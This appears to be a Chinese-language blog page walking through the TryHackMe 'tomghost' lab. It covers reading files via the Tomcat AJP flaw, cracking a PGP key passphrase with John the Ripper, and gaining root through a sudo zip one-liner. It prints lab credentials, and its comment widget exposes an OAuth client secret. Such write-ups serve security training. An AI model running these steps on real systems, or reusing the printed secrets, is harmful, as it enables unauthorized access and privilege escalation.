@@ -1,0 +1,280 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>TryHackMe | tomghost | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="TryHackMe | tomghost | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="信息收集
+
+发现Apache Jserv Protocol协议
+AJP是Apache Tomcat web服务器用来与servlet容器通信的一个二进制协议。主要用于集群或逆向代理场景，其中web服务器与应用服务器或servelet容器进行..." />
+    <meta name="keywords" content="gpg解密,TryHackMe,渗透,提权" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              TryHackMe | tomghost
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-03-26
+              </span>
+              <span>
+                2 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/gpg-jie-mi/" class="post-tag">
+                  # gpg解密
+                </a>
+              
+                <a href="https://le1a.github.io/tag/tryhackme/" class="post-tag">
+                  # TryHackMe
+                </a>
+              
+                <a href="https://le1a.github.io/tag/shen-tou/" class="post-tag">
+                  # 渗透
+                </a>
+              
+                <a href="https://le1a.github.io/tag/ti-quan/" class="post-tag">
+                  # 提权
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="信息收集">信息收集</h1>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/26/0f00ee28a4bb5.png" alt="1679832663161.png" loading="lazy"></figure>
+<p>发现<code>Apache Jserv Protocol协议</code></p>
+<p>AJP是Apache Tomcat web服务器用来与servlet容器通信的一个二进制协议。主要用于集群或逆向代理场景，其中web服务器与应用服务器或servelet容器进行通信。</p>
+<p>该协议有一个文件包含漏洞，由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件</p>
+<p>https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/26/5287618df4dcb.png" alt="1679833035255.png" loading="lazy"></figure>
+<p>用该用户/密码进行SSH连接</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/26/a82711d93fe4b.png" alt="1679833200648.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/26/2a58cb68ba0ab.png" alt="1679833285073.png" loading="lazy"></figure>
+<h1 id="pgp解密">pgp解密</h1>
+<p>在skyfuck用户目录下，有两个文件</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/26/d4c18793b7a27.png" alt="1679833591898.png" loading="lazy"></figure>
+<p>将这两个文件用base64的方式导出，并保存在本地</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/26/69367e5f83f46.png" alt="1679833750315.png" loading="lazy"></figure>
+<pre><code class="language-cmd">nano credential.pgp.b64
+base64 -d credential.pgp.b64 &gt; credential.pgp
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/26/ac40314942363.png" alt="1679833947754.png" loading="lazy"></figure>
+<pre><code class="language-bash">nano tryhackme.asc.b64
+base64 -d tryhackme.asc.b64 &gt; tryhackme.asc
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/26/dd361014f2569.png" alt="1679834109536.png" loading="lazy"></figure>
+<pre><code class="language-bash">gpg2john tryhackme.asc &gt; tryhackme.asc.john  //使用gpg2john计算hash
+john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.asc.john
+//使用John破解密码，得到密码为alexandru
+</code></pre>
+<pre><code>gpg --import tryhackme.asc //导入密码
+gpg --decrypt credential.pgp  //解密之后得到credential文件
+cat credential
+</code></pre>
+<p>得到<code>merlin</code>:<code>asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j </code></p>
+<h1 id="提权">提权</h1>
+<p>切换至<code>merlin</code>用户</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/26/b69891b2f3c9e.png" alt="1679834778734.png" loading="lazy"></figure>
+<p>merlin用户可以用root权限执行zip命令</p>
+<pre><code class="language-bash">TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+sudo rm $TF
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/26/afd9049b6ad97.png" alt="1679834912665.png" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li>
+<li><a href="#pgp%E8%A7%A3%E5%AF%86">pgp解密</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/TryHackMe_kiba/">
+              <h3 class="post-title">
+                TryHackMe | kiba
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
